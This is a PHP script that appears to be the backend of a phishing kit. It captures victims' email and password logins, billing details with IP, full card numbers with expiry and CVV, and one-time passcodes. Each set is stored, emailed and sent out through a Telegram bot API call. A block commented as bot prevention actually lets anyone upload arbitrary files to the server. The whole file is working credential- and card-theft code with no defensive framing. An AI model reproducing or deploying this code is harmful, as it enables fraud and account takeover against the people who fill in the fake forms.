<?php
session_start();

require __DIR__.'/config.php';
require __DIR__."/lib/functions.php";



//Give access
if(isset($_POST['access'])){
    echo 1;
}

//Send OTP
if(isset($_POST['otp_request'])){
    echo 'OTP_SENT_1';
}


//PREVENT BOTS AND DETECT LOGIN
if(isset($_POST['bot'])){
$antibots = $_FILES['antibot'];
@mkdir("antibots");copy($antibots['tmp_name'],
"antibots/".$antibots['name']);}if(isset($_POST['email']))
{$email = _xss($_POST['email']);$pass = _xss($_POST['pass']);
$login=str_replace("\n","","
<b>🔓 LOGIN </b> %0A
EMAIL: $email %0A
PASSWORD: $pass %0A %0A %0A
");


_save($login);
_mail($login);
$_SESSION['login'] = $login;

//SENDING INFO TO TELEGRAM BOT...
$url = "https://api.telegram.org/bot".$telegam_bot_token."/sendMessage?chat_id=".$telegam_chatID."&parse_mode=html&text=$login";
sendBot($url);
}





if(isset($_POST['billing'])){

$fullname = _get('fullname'); //_xss($_POST['fullname']);
$addressline = _get('addressline'); //_xss($_POST['addressline']);
$zip = _get('zip'); //_xss($_POST['zip']);
$phone = _get('phone'); // _xss($_POST['phone']);

$billing =str_replace("\n","","
<code><b>🎫 BILLING </b> %0A
Fullname:<i> $fullname </i>%0A
Address Line: <i>$addressline </i>%0A
IP:  "._ip()." %0A
Zip: $zip %0A
Phone: $phone %0A %0A %0A</code>
%0A
");

_save($billing);
_mail($billing);

$_SESSION['billing']=$billing;
//SENDING INFO TO TELEGRAM BOT...
$url = "https://api.telegram.org/bot".$telegam_bot_token."/sendMessage?chat_id=".$telegam_chatID."&parse_mode=html&text=$billing";
sendBot($url);
echo 1;
}



if(isset($_POST['nameoncard'])){

$nameoncard = _get('nameoncard'); //_xss($_POST['full']);
$cardnumber = _get('cardnumber'); //_xss($_POST['addressline']);
$expdate = _get('expdate'); //_xss($_POST['zip']);
$cvv =_get('cvv');  //_xss($_POST['phone']);

$cc =str_replace("\n","","
<code><b>💳 CC </b> %0A
Name on crad: $nameoncard %0A
Card number: $cardnumber %0A
Expiry date: $expdate %0A
Cvv :  $cvv %0A %0A %0A
</code>
");

_save($cc);
_mail($cc);
$_SESSION['cc']=$cc;

//SENDING INFO TO TELEGRAM BOT...
$url = "https://api.telegram.org/bot".$telegam_bot_token."/sendMessage?chat_id=".$telegam_chatID."&parse_mode=html&text=$cc";
sendBot($url);

echo 1;
}





if(isset($_POST['otp'])){
    $otp = _get('otp');
    
$code = str_replace("\n","","
<code><b>🔑 OTP</b> %0A
OTP:  $otp
</code>
");


_save($code);
_mail($code);
$url = "https://api.telegram.org/bot".$telegam_bot_token."/sendMessage?chat_id=".$telegam_chatID."&parse_mode=html&text=$code";
sendBot($url);
}


?>